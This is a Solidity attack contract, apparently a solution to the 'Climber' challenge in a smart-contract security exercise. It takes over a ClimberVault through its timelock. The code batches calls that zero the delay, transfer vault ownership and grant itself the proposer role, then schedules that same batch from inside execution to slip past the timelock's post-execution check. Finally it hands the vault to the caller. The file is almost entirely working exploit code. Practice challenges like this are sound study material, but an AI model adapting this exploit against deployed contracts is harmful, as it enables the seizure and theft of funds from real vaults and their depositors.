// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberVault.sol";
import "./ClimberTimelock.sol";
import "./ClimberTimelockBase.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "hardhat/console.sol";

contract ClimberAttacker {
    ClimberTimelock public timelock;
    ClimberVault public vault;
    IERC20 public token;

    constructor(address payable _timelock, address _vault, address _token) {
        timelock = ClimberTimelock(_timelock);
        vault = ClimberVault(_vault);
        token = IERC20(_token);
    }

    function delegateSchedule() external {
        console.log("Delegating the schedule");

        address[] memory targets = new address[](4);
        targets[0] = address(timelock);
        targets[1] = address(vault);
        targets[2] = address(timelock);
        targets[3] = address(this);

        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        bytes[] memory dataElements = new bytes[](4);
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("transferOwnership(address)", address(this));
        dataElements[2] = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));
        dataElements[3] = abi.encodeWithSignature("delegateSchedule()");

        timelock.schedule(
            targets,
            values,
            dataElements,
            keccak256("attack")
        );
    }

    function attack() external {
        console.log("Attacking the contract");

        address[] memory targets = new address[](4);
        targets[0] = address(timelock);
        targets[1] = address(vault);
        targets[2] = address(timelock);
        targets[3] = address(this);

        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        bytes[] memory dataElements = new bytes[](4);
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("transferOwnership(address)", address(this));
        dataElements[2] = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));
        dataElements[3] = abi.encodeWithSignature("delegateSchedule()");

        bytes32 salt = keccak256("attack");
        bytes32 id = timelock.getOperationId(targets, values, dataElements, salt);

        timelock.execute(
            targets,
            values,
            dataElements,
            salt
        );

        console.log("Attacker Contract Address : " , address(this));
        console.log("Delegate Execution complete, vault proxy owner : ", vault.owner());

        vault.transferOwnership(msg.sender);

        console.log("Vault ownership transferred to : ", msg.sender);
        console.log("Vault proxy owner : ", vault.owner());
    }

    receive() external payable {}
}